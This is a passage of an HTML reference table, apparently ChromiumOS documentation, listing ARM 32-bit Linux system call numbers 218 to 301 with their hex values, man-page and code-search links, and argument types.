count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">218</td><td>pivot_root</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pivot_root.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pivot_root">cs/</a></td><td align="center">0xda</td><td>const char *new_root</td><td>const char *put_old</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>mincore</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mincore.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mincore">cs/</a></td><td align="center">0xdb</td><td>unsigned long start</td><td>size_t len</td><td>unsigned char * vec</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">220</td><td>madvise</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/madvise.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*madvise">cs/</a></td><td align="center">0xdc</td><td>unsigned long start</td><td>size_t len</td><td>int behavior</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">221</td><td>fcntl64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fcntl64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fcntl64">cs/</a></td><td align="center">0xdd</td><td>unsigned int fd</td><td>unsigned int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xde</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">223</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xdf</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">224</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xe0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">225</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xe1</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">226</td><td>setxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setxattr">cs/</a></td><td align="center">0xe2</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">227</td><td>lsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lsetxattr">cs/</a></td><td align="center">0xe3</td><td>const char *path</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">228</td><td>fsetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fsetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fsetxattr">cs/</a></td><td align="center">0xe4</td><td>int fd</td><td>const char *name</td><td>const void *value</td><td>size_t size</td><td>int flags</td><td>-</td></tr><tr><td align="center">229</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0xe5</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0xe6</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0xe7</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0xe8</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0xe9</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>flistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0xea</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">235</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0xeb</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">236</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0xec</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">237</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0xed</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">238</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0xee</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>sendfile64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile64">cs/</a></td><td align="center">0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">240</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0xf0</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">241</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">242</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">243</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0xf3</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">244</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0xf4</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">245</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0xf5</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">246</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0xf6</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">247</td><td>io_cancel</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0xf7</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">248</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0xf8</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">249</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0xf9</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">250</td><td>epoll_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create">cs/</a></td><td align="center">0xfa</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">251</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0xfb</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">252</td><td>epoll_wait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait">cs/</a></td><td align="center">0xfc</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td></tr><tr><td align="center">253</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0xfd</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">254</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfe</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">255</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xff</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">256</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0x100</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">257</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0x101</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">258</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0x102</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">259</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0x103</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">260</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0x104</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">261</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0x105</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0x106</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0x107</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">264</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0x108</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">265</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0x109</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">266</td><td>statfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs64">cs/</a></td><td align="center">0x10a</td><td>const char *path</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>fstatfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs64">cs/</a></td><td align="center">0x10b</td><td>unsigned int fd</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0x10c</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>utimes</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimes.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimes">cs/</a></td><td align="center">0x10d</td><td>char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>arm_fadvise64_64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/arm_fadvise64_64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*arm_fadvise64_64">cs/</a></td><td align="center">0x10e</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">271</td><td>pciconfig_iobase</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_iobase.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_iobase">cs/</a></td><td align="center">0x10f</td><td>long which</td><td>unsigned long bus</td><td>unsigned long devfn</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">272</td><td>pciconfig_read</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_read.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_read">cs/</a></td><td align="center">0x110</td><td>unsigned long bus</td><td>unsigned long dfn</td><td>unsigned long off</td><td>unsigned long len</td><td>void *buf</td><td>-</td></tr><tr><td align="center">273</td><td>pciconfig_write</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pciconfig_write.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pciconfig_write">cs/</a></td><td align="center">0x111</td><td>unsigned long bus</td><td>unsigned long dfn</td><td>unsigned long off</td><td>unsigned long len</td><td>void *buf</td><td>-</td></tr><tr><td align="center">274</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0x112</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">275</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0x113</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">276</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0x114</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">277</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0x115</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">278</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0x116</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0x117</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">280</td><td>waitid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0x118</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">281</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0x119</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">282</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0x11a</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0x11b</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0x11c</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">285</td><td>accept</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td><td align="center">0x11d</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">286</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0x11e</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">287</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0x11f</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">288</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0x120</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">289</td><td>send</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/send.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*send">cs/</a></td><td align="center">0x121</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0x122</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">291</td><td>recv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recv">cs/</a></td><td align="center">0x123</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>-</td><td>-</td></tr><tr><td align="center">292</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0x124</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">293</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0x125</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">294</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0x126</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">295</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0x127</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">296</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0x128</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">297</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0x129</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">298</td><td>semop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td><td align="center">0x12a</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">299</td><td>semget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td><td align="center">0x12b</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">300</td><td>semctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td><td align="center">0x12c</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td></tr><tr><td align="center">301</td><td>msgsnd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td><td align="center">0x12d</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int 